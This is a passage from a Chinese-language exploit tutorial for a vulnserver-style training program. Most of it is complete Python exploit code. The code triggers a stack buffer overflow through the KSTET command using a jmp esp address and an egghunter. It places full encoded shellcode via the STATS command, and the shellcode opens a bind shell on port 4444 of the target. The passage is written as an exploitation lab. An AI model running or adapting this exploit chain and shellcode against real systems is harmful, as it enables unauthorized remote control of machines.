    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
当然在使用egghunter之前，必须要确认egg
hunter代码之前偏移（A的数量）。为此我们做一个如图所示计算考虑到20占用一个字节因此需要24个字节（$+18Hex）
如图，为本篇缓冲区利用流程示意图。
为了测试计算是否正确，执行如下
    #!/usr/bin/python
    import socket
    import sys
    #jmp esp 625011AF
    esp ="\xAF\x11\x50\x62"
    opcode ="\xEB\xCC"
    egghunter =  ""
    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    evil = "A" * 24
    evil += egghunter
    evil += "A" * (70-len(evil))
    evil += esp + opcode
    evil += "C" * (1000-len(evil))
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('172.16.242.132',9999))
    s.send('KSTET ' + evil + '\r\n')
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close
有效，重定向gghunter代码
然后我们生成我们需要的shellcode
## 8\. 利用其他功能放入Shellcode
由于shellcode不够放入KSTET命令中，因此需要使用开篇所说，该程序的其他命令。STATS命令放置了shellcode。这样，我的shellcode将被放置在内存中的某个位置，并让Egghunter找到它
    #!/usr/bin/python
    import socket
    import sys
    ip = "172.16.242.132"
    port = 9999
    shellcode =  "hackhack"
    shellcode += "\xb8\x85\x10\xa1\xec\xda\xdd\xd9\x74\x24\xf4\x5b"
    shellcode += "\x31\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\xc6"
    shellcode += "\x1e\x43\x19\x34\xf6\x01\xe2\xc4\x07\x66\x6a\x21"
    shellcode += "\x36\xa6\x08\x22\x69\x16\x5a\x66\x86\xdd\x0e\x92"
    shellcode += "\x1d\x93\x86\x95\x96\x1e\xf1\x98\x27\x32\xc1\xbb"
    shellcode += "\xab\x49\x16\x1b\x95\x81\x6b\x5a\xd2\xfc\x86\x0e"
    shellcode += "\x8b\x8b\x35\xbe\xb8\xc6\x85\x35\xf2\xc7\x8d\xaa"
    shellcode += "\x43\xe9\xbc\x7d\xdf\xb0\x1e\x7c\x0c\xc9\x16\x66"
    shellcode += "\x51\xf4\xe1\x1d\xa1\x82\xf3\xf7\xfb\x6b\x5f\x36"
    shellcode += "\x34\x9e\xa1\x7f\xf3\x41\xd4\x89\x07\xff\xef\x4e"
    shellcode += "\x75\xdb\x7a\x54\xdd\xa8\xdd\xb0\xdf\x7d\xbb\x33"
    shellcode += "\xd3\xca\xcf\x1b\xf0\xcd\x1c\x10\x0c\x45\xa3\xf6"
    shellcode += "\x84\x1d\x80\xd2\xcd\xc6\xa9\x43\xa8\xa9\xd6\x93"
    shellcode += "\x13\x15\x73\xd8\xbe\x42\x0e\x83\xd6\xa7\x23\x3b"
    shellcode += "\x27\xa0\x34\x48\x15\x6f\xef\xc6\x15\xf8\x29\x11"
    shellcode += "\x59\xd3\x8e\x8d\xa4\xdc\xee\x84\x62\x88\xbe\xbe"
    shellcode += "\x43\xb1\x54\x3e\x6b\x64\xc0\x36\xca\xd7\xf7\xbb"
    shellcode += "\xac\x87\xb7\x13\x45\xc2\x37\x4c\x75\xed\x9d\xe5"
    shellcode += "\x1e\x10\x1e\x18\x83\x9d\xf8\x70\x2b\xc8\x53\xec"
    shellcode += "\x89\x2f\x6c\x8b\xf2\x05\xc4\x3b\xba\x4f\xd3\x44"
    shellcode += "\x3b\x5a\x73\xd2\xb0\x89\x47\xc3\xc6\x87\xef\x94"
    shellcode += "\x51\x5d\x7e\xd7\xc0\x62\xab\x8f\x61\xf0\x30\x4f"
    shellcode += "\xef\xe9\xee\x18\xb8\xdc\xe6\xcc\x54\x46\x51\xf2"
    shellcode += "\xa4\x1e\x9a\xb6\x72\xe3\x25\x37\xf6\x5f\x02\x27"
    shellcode += "\xce\x60\x0e\x13\x9e\x36\xd8\xcd\x58\xe1\xaa\xa7"
    shellcode += "\x32\x5e\x65\x2f\xc2\xac\xb6\x29\xcb\xf8\x40\xd5"
    shellcode += "\x7a\x55\x15\xea\xb3\x31\x91\x93\xa9\xa1\x5e\x4e"
    shellcode += "\x6a\xc1\xbc\x5a\x87\x6a\x19\x0f\x2a\xf7\x9a\xfa"
    shellcode += "\x69\x0e\x19\x0e\x12\xf5\x01\x7b\x17\xb1\x85\x90"
    shellcode += "\x65\xaa\x63\x96\xda\xcb\xa1"
    #jmp esp 625011AF
    esp ="\xAF\x11\x50\x62"
    opcode ="\xEB\xCC"
    egghunter =  ""
    egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
    egghunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x63\x6b\x89\xd7"
    egghunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    evil = "A" * 24
    evil += egghunter
    evil += "A" * (70-len(evil))
    evil += esp + opcode
    evil += "C" * (1000-len(evil))
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.send("STATS " + shellcode + '\r\n')
    s.recv(1024)
    s.close
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.send('KSTET ' + evil + '\r\n')
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close
## 9\. 漏洞利用
执行最终的利用代码后，查看shellcode 是否有效
由于shellcode有效，因此目标机开启4444端口，最好只需要连接获取权限即可